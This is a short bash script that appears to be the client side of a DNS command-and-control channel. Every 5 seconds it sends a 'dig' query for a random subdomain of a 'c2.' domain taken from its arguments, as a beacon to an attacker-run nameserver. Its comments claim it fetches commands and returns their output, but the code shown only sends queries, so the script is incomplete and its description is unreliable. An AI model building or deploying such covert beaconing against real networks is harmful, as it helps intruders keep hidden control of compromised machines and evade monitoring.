#!/bin/bash

# This script checks for new commands from a c2 module running on the nameserver
# checks every 5 seconds and responds to the ns with the command output

origin=$(echo "c2." "$2" | sed 's/ //g' | sed 's/\.\././g') 
uniqid=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10 | head -n 1)

while true ; do 
	
	randprefix=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10 | head -n 1)
	dig +short "$randprefix$uniqid$origin" 

	sleep 5 
done

